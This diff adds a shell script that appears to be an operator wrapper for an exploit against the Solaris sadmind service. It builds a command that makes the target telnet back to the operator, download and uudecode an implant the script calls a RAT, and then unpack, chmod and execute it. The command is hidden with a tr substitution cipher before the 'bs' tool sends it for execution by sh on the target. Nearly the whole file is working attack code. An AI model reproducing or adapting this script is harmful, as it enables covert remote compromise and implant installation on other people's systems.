@@ -1,0 +1,145 @@
+#!/bin/sh
+PROG=`basename ${0}`
+ERRSLEEP=3
+
+  usage()
+    {
+     echo "
+Usage:
+       [E=ratpreargs] [A=ratpostargs] $PROG remoteIP remoteHost \\
+       [remoteDomain] \\
+       sadmindPort remoteDir remoteName localIP localPort
+ 
+       ratpreargs  : the string put on remote command line right after PATH=. and 
+                      before remoteName (e.g. E='D=\"-c LOCALIP port\"' or
+                     E='D=\"-l listenport\"')
+ 
+       ratpostargs : the string put on remote command line after running remoteName
+
+       Command sent to bs will be munged from:
+
+CMD=\"mkdir -p \${REMOTE_DIR} && cd \${REMOTE_DIR} && telnet \${LOCAL_IP} \${LOCAL_PORT} < /dev/console | uudecode > /dev/null 2>&1 && uncompress -f \${REMOTE_FNAME}.Z && chmod 755 \${REMOTE_FNAME} && PATH=.\${RAT_PREARGS} \${REMOTE_FNAME}\${RAT_POSTARGS}\"
+
+"
+    exit 1
+    }
+echo "
+CommandLine: ${0} ${*}"
+while getopts h op; do
+    case $op in
+    E)  RAT_PREARGS=" $OPTARG";;
+    A)  RAT_POSTARGS=" $OPTARG";;
+    h)  usage
+    esac
+done
+
+[ "$E" ] && RAT_PREARGS=" $E" && echo "RAT_PREARGS=$RAT_PREARGS"
+[ "$A" ] && RAT_POSTARGS=" $A" && echo "RAT_POSTARGS=$RAT_POSTARGS"
+
+
+REMOTE_IP="-i ${1}"
+REMOTE_HOST="-h ${2}"
+
+case ${#} in
+  7)
+    SADMIND_PORT="-p ${3}"
+    REMOTE_DIR="${4}"
+    REMOTE_FNAME="${5}"
+    LOCAL_IP="${6}"
+    LOCAL_PORT="${7}"
+    ;;
+  8)
+    REMOTE_DOMAIN="-d ${3}"
+    SADMIND_PORT="-p ${4}"
+    REMOTE_DIR="${5}"
+    REMOTE_FNAME="${6}"
+    LOCAL_IP="${7}"
+    LOCAL_PORT="${8}"
+    ;;
+  *)
+    echo "
+Wrong number of arguments: ${#} (should be 7 or 8)."
+    sleep $ERRSLEEP
+    usage
+    ;;
+esac
+# Check for required args
+[ -z "$REMOTE_IP" ] && echo "Error: missing remote IP" && usage
+[ -z "$REMOTE_HOST" ] && echo "Error: missing remote hostname" && usage
+[ -z "$SADMIND_PORT" ] && echo "Error: missing remote hostname" && usage
+[ -z "$REMOTE_DIR" ] && echo "Error: missing remote directory" && usage
+[ -z "$REMOTE_FNAME" ] && echo "Error: missing remote filename" && usage
+[ -z "$LOCAL_IP" ] && echo "Error: missing local IP" && usage
+[ -z "$LOCAL_PORT" ] && echo "Error: missing local port" && usage
+
+if [ "`echo $REMOTE_DIR | cut -c1`" != "/" ]; then
+    echo "
+REMOTEDIR ($REMOTE_DIR) must start with \"/\". Check # of args and order."
+    sleep $ERRSLEEP
+    usage
+
+fi
+
+
+
+# this one has more spaces...don't use unless other fails...
+CMD="mkdir -p ${REMOTE_DIR} && cd ${REMOTE_DIR} && telnet ${LOCAL_IP} ${LOCAL_PORT} < /dev/console | uudecode > /dev/null 2>&1 && uncompress -f ${REMOTE_FNAME}.Z && chmod 755 ${REMOTE_FNAME} && PATH=.${RAT_PREARGS} ${REMOTE_FNAME}${RAT_POSTARGS}"
+
+CMD="mkdir -p ${REMOTE_DIR}&&cd ${REMOTE_DIR}&&telnet ${LOCAL_IP} ${LOCAL_PORT}</dev/console|uudecode>/dev/null 2>&1&&uncompress -f ${REMOTE_FNAME}.Z&&chmod 755 ${REMOTE_FNAME}&&PATH=.${RAT_PREARGS} ${REMOTE_FNAME}${RAT_POSTARGS}"
+
+
+# tr sets
+#SET1="'0-}'"
+#SET2="'1-~'"
+ALPHA="ABCDEFGHIJKLMNOPQRSTUVWXYZ./abcdefghijklmnopqrstuvwxyz0123456789 <>&"
+THERE=`which permute 2>/dev/null`
+if [ ! "$THERE"  ] ; then
+  if [ -x "../bin/permute" ] ; then
+    export PATH=../bin:$PATH
+  else
+    echo "FATAL ERROR: No \"permute\" in path."
+    exit
+  fi
+fi
+SET1=`permute "$ALPHA"`
+SET2=`permute "$SET1"`
+MUNGED="`echo "${CMD}" | tr "${SET1}" "${SET2}"`"
+UNMUNGED="`echo \"${MUNGED}\" | tr "${SET2}" "${SET1}"`"
+echo "
+munging via:
+tr \"$SET1\" \"$SET2\"
+and vice versa.
+
+  MUNGED=\"$MUNGED\"
+
+UNMUNGED=\"$UNMUNGED\"
+"
+
+if [ "$SET1" = "$SET2" ] ; then
+  echo "FATAL ERROR. SET1 is the same as SET2."
+  echo "SET1=\"$SET1\""
+  exit
+fi
+if [ ! "$UNMUNGED" = "$CMD" ] ; then
+  echo "FATAL ERROR. UNMUNGE TEST FAILED"
+  echo "$UNMUNGED" > /tmp/UNMUNGED.$$
+  echo "$CMD" > /tmp/CMD.$$
+  cmp /tmp/UNMUNGED.$$ /tmp/CMD.$$
+  wc /tmp/UNMUNGED.$$ /tmp/CMD.$$
+  exit
+else
+  echo "PASSSED TEST: \$CMD eq \$UNMUNGED.
+"
+fi
+
+echo "Running:
+bs ${REMOTE_IP} ${REMOTE_HOST} ${REMOTE_DOMAIN} ${SADMIND_PORT} \
+  -c \"echo '${MUNGED}'|tr '${SET2}' '${SET1}'|sh\"
+"
+
+#[ "$PAUSE" ] && echo "Hit ^C to abort or enter to continue" && read blah
+echo "Hit ^C to abort or enter to continue" && read blah
+
+bs ${REMOTE_IP} ${REMOTE_HOST} ${REMOTE_DOMAIN} ${SADMIND_PORT} \
+  -c "echo '${MUNGED}' | tr '${SET2}' '${SET1}'|sh"
+
